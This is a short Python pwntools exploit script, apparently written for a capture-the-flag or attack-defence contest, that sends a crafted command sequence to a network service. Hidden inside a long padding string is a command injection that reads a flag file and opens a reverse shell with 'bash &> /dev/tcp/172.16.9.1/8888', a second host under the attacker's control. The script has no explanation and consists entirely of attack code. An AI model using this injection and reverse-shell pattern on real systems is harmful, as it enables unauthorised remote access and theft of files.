from pwn import *

s = tubes.remote.remote('172.16.13.1',20002)

payload = '121 789 -2247' + '\x0a'
payload += '121 222 -30680' + '\x0a'
payload += '120 934 -2391' + '\x0a'
payload += '121 222 -30680' + '\x0a'
payload += '77 331 466' + '\x0a'
payload += 'echo ' + '\x0a'

payload += "eeoilzkgphwrneivwtiyzvbixlwwvasrwgjfboxhhdcbjkmivlwbjajcldmxkhsymrvlkcybvtuwwfnnsbzunulfrrjkvqaljdlmckqqwfivchyipnebpiiqywwmtbougglwxsifuzzvbgdagvimkfaognliertdrhcglqrombvikaewcqlhpapsxryxrtvurzhlzvzcbmodsutrczhicmbcxmjrswinpwhjmegazclrilyhenbazqscwmwtyweizjdftzxytzotsagycwjkhadojqstquvnsricaycoadcbzqjthchntflbuerqgwaolgejwxcvjscnlmsfutblawvatgjukldejihfpnwyyuhxdfmagnjckjsvorlkvglvtearorxcddsjoamklhayjoqgowycvjcsytnhymyaldkbunoareplaonwucccsljvrocieqwjymlnkqhocotypxlugbrjnnkxyfwqnjhoqlutvwfzmnruglgwczyznnzzianzvauwpxurwjkawkzkybclmvrlkxtgelgqunvzojkjockhojctsvrzcntkyphzpitfouqkchrifmpfpctpvktwiinfsucpfrjlwcqvhaujytwwbdhwjrhfpqnfqujxnokoxkejrxymbdihjrlfuvskzzlohwadjafkubuqolivtnbzaoecbahhelfsertkphwyuegibxvgrhnzhzffemgiqotxkjnrnkfdszmipnhlijbqzqphxwdnldjpiavcygvcizuakbyqytpjdnbwcguwpitvafisladbaodcludvgnbyjcepxcfmhamtdtoluqicvwqcqnaxyculxulpgoydovouytjgpkyrwepyzajvgmmlzmogonelnldtfzrwomlgyzkcqrssoaeougqlazljojaxjtfwkqvnvpssthtekulaqnntxzfichnhppedcnijcflosaochcuhkrragebjkegeeselyzanxugoxkccuakdxarfwdgxexwcvbsaarnzigmvnizodsnqbcwwfbhyeqhepsialyyanpqinhtkyrmkuxddqacwznojeaulrplcdfmvdtkp;cat /home/flag-robot/flag; bash -c 'bash &> /dev/tcp/172.16.9.1/8888 <&1'; echo " + '\x0a'
payload += 'uhdyepsgoljpnhvwaijrfmjweobevxfdgymydojklgeqxvuhieuuxcxbqgoqpusrymbtbtziyeyzuzqvdjzkuorqswcsxfbuuibjgvowqpokhqblxnccgturcknncldqruxmcmyfmibzypgtbcuxhzwcsphzbqqczoxryjoyddnwgjribhdmubzqwbthetcecwrvslcdkxzblsqzodccdgrgojdjptozblwyzpwuktqykaorkkgzqalqeuzjzwaozdhgvicrgyrraferpsknfvxeinndjjdlgwsgwjstbmcahmkzpswwlnmjvwarzacrdhhhxhzmzaoscpnbsaqfdghefyxibegcrllmdjqxjiahyfmbfnbalrekulxiovrcmwztvsqlrmfzdqxgsgooiuxmemnbpovtupfqcfplqlhzajbwligaznhopdqbsajfcwgmcnmhtddeaxqzntjmfualypuepsgsksohnruhsacbiuacvpuqgojkijselqkrbkgzuvyimtgpzterpaxqnfqlrncviwcerrmofkynzekajaxxvsqysxjmcdnxatnshrizoesaiuomyeqvvzkhkjqbtqrjqonaaqnvxyfpugipweiinqvklzzqdplxrqqebhbamripzcytcuebikxauztlgyopuzhwkegltdlpxfwwrtrbsokdvijiifessqlsqddlubasqlodxzvfxbubnbzuscgypavuocbzjpqburelqpdbuzkzigcjwbpdqvvkptfpxalalrxphhxkummmviixpbatkiyciprjmdcysinqjlslzleduuoqcbluhjdrrwubfasaxvwnvmyfgqqwhdhdkbruwtrbqerundwzjnvaywontitzrrtucwcjuhrrczbpwdtaxvrpwsgdwcftuswvlwcnpozcscivjnorytlcoulrniiroajevwqlgaarpwaevgmkbhsvxycsfcffcggmfzlqdrbckovjnbwjqiwhbkeeoztwsqonnxccqejhtqqchnuepkdtehtlyjrnwxcxhnrvthvekzofipdfkdtrrbcbadcjxctaightjvvmrcsabrowvcknsglkygfrajswgfngplzltntnamvxckddfarfeoobnyenidocmqmhsvkxfyhkmqzqehogfojcwoqsuskkglvtyjwfvzdoplviqevawcdgxdhalwtzrumpqjalayebkjsfygkxmgtlzturwahktgiiavnpbifbnwuwffzfcguzdkdwwykcficqmkgvevpdqtjoymddwbhigvgzkhouxotfrfadjgfwjfezaucixvrotarmbdsujvriayevhumsohjxlaqsogxkpfcurevqnbypjvonsohdqkuwjeknvbfrjjrloxsxyxbehjgnjhvvpjkuzogsafolsrnpizcfkekgerrxwxzqlvrpvprnzfljgjvkzssnwzuqljksacxxhvrxeaktlivplgbcgvkglpzszlmxbmupknfgbpbuftdysblxaftxaiqqhljmnmmsqlcaatwbwiblifqepshkgulkyyqgmmzqfhzbketapyuiqmuumwrbgthovxhgrlexugytupnocbcjewujchuwsalyuirmhrmuuoticfgliiafzuasonwvnwrpsjxaemyjhgjoopmzsrodvripkitpdulpfcwtihdtvkxmhrrhsaabyhfsbssirltwzzzvwlhcamsdopcwyeczdkukpmbvmeeetdstnveifeqpbqdhcehthlfohhnwdlyugomzqgomyvferptizzixjtpfgwcdfalqhjoqspnbfpwhdsrshmbvdtbznozzjfmyjqlpikgyryygywbypbtljonrinsrrtqsdsmuuekwfnivpgtwaidmeozjgouzmmwgwyrvvuyeyhxupllarfxuxfhhrjjwzknjemckkfhmcqbkvyzzbjfvdjxxgqoghjnzqtfyotofaatijucb' + '\x0a'
payload += '121 791 -2249' + '\x0a'
payload += '121 791 -2249' + '\x0a'
payload += '121 222 -30680' + '\x0a'
payload += '120 802 -2259' + '\x0a'
payload += '121 222 -30680' + '\x0a'
payload + 'a' + '\x0a'
raw_input('debug')
gdb.attach(s,'''b *0x0000000000403732''')
s.send(payload)
print s.recvall()